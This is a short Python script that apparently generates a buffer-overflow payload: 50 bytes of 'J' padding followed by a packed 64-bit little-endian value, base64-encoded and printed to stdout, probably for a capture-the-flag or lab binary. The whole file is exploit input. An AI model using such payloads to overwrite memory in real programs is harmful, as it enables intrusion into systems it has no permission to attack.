
import sys
import struct
import base64

buf = b'JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ'
buf += struct.pack('<Q', 17380156660906096523)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
